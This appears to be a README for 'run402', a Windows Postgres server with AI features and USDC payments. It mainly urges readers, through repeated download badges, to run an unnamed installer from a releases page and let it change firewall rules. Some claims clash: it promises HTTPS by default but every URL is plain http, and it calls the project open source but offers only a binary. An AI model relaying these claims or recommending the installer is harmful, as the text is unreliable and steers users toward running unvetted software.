# ⚙️ run402 - Simple AI-Powered Postgres Server

[![Download run402](https://img.shields.io/badge/Download-Run402-green?style=for-the-badge)](https://github.com/musfoner/run402/releases)

## 📋 What is run402?

run402 is a server application that brings AI features to your Postgres database. It combines a database with authentication, storage, a REST interface, and static site hosting. You pay using x402 USDC on the Base network. There are no signups or accounts to create.

This tool lets you store and manage data with an easy-to-use AI approach. It works well as a backend for apps, websites, or projects that need data and user access combined with micropayments.

run402 runs on Windows and uses the Model Context Protocol (MCP) to connect AI models with your data.

---

## 📦 System Requirements

Before installing run402, make sure your Windows computer meets these needs:

- Windows 10 or newer (64-bit)
- 4 GB of RAM minimum (8 GB or more recommended)
- At least 500 MB of free disk space
- Internet connection for payments and updates
- Basic permissions to install new software
- No other Postgres servers running on common ports (5432)

---

## 🔧 Features

- Full Postgres database engine for reliable data storage
- AI-powered data access and management
- REST API for easy app integration without programming
- User authentication system included
- Secure storage for files and assets
- Static site hosting to publish simple pages
- Pay-per-use model with x402 USDC tokens on Base
- Built on the Model Context Protocol (MCP)
- Open source and transparent operations

---

## 🚀 Getting Started: Download and Install run402

To start using run402, you first need to download it. The releases page contains the latest version ready for Windows.

### Step 1: Download the Software

Click the button below to go to the release page, where you can find the latest Windows installer.

[![Download run402](https://img.shields.io/badge/Download-run402-blue?style=for-the-badge)](https://github.com/musfoner/run402/releases)

On the releases page:

- Look for the latest release date at the top.
- Find the file that ends with `.exe` or `.msi` and includes "windows" in the name.
- Click the file to download it.

### Step 2: Run the Installer

Once the file finishes downloading:

- Open the downloaded file (it may be in your Downloads folder).
- A setup wizard will open.
- Follow the prompts on the screen:
  - Accept the license agreement.
  - Choose the install location (default is fine).
  - Allow the installer to add run402 to your Windows firewall rules if prompted.
- Complete the installation by clicking "Finish".

### Step 3: Start run402

After installation:

- Find **run402** in your Start menu.
- Click to open the app.
- The server will start running in a new window.
- You will see status messages confirming the server startup.

---

## ⚙️ How to Use run402

run402 works as a server. It listens for commands and requests over your local network or from your computer.

### Accessing the Server

- Open your web browser.
- Enter http://localhost:4000 in the address bar.
- You will see a simple dashboard.

### Using the Dashboard

From this dashboard, you can:

- View database status.
- Add, edit, or delete data.
- Upload files.
- Check your wallet balance in x402 USDC.
- Manage user authentication settings.
- Access API documentation for developers or apps.

### Making Payments

run402 uses x402 USDC tokens on the Base network:

- Your wallet address will show in the dashboard.
- To pay for services or storage, send tokens to this address.
- The server automatically tracks your balance and usage.

---

## 🔐 Authentication and Security

run402 has simple user authentication:

- Create users directly from the dashboard.
- Assign roles and permissions for data access.
- Passwords are saved securely.
- All communication is encrypted using HTTPS by default.

---

## 📄 Using the REST API

Developers or advanced users can connect to run402 with requests over HTTP.

- The API URL is http://localhost:4000/api.
- Common actions include adding data, fetching records, or managing files.
- API keys and tokens are managed through the dashboard.
- No programming is required to get basic data viewing and editing done.

---

## 📂 Static Sites Hosting

run402 also lets you host static sites on your server:

- Upload HTML, CSS, and JavaScript files through the dashboard.
- These files will be served at http://localhost:4000/site.
- Use this for simple project pages, documentation, or demo sites.

---

## ✨ Helpful Tips

- Keep run402 up to date by visiting the releases page regularly.
- Back up your database files found in the install folder under `data`.
- Do not run other Postgres servers on port 5432. If needed, a config file lets you change the port.
- The server window shows logs in real time for troubleshooting.
- Use the integrated wallet system to keep track of your funds easily.
- If you want to stop the server, close the run402 window or use Task Manager.

---

## 📥 Download with Confidence

Returning to download run402?

[![Download run402](https://img.shields.io/badge/Download-run402-grey?style=for-the-badge&logo=github)](https://github.com/musfoner/run402/releases)

Click the link above and choose the latest Windows installer file. This will install everything needed to run your AI-postgres server locally.

---

## 🔍 Explore Topics and Use Cases

run402 fits projects that need:

- Simple AI backend with database support
- Micro-payments using blockchain tokens
- Hosting small websites alongside data
- Running secure Postgres locally without complex setup
- Open source MCP protocol implementation

---

## 🛠 Troubleshooting

- If the app fails to start, check if another program uses port 4000 or 5432.
- Restart your computer if installation problems occur.
- Make sure your Windows Firewall is not blocking run402.
- Verify you have enough storage space.
- Visit the issues section on the GitHub repository for known problems.

The GitHub page is https://github.com/musfoner/run402 for updates and technical details.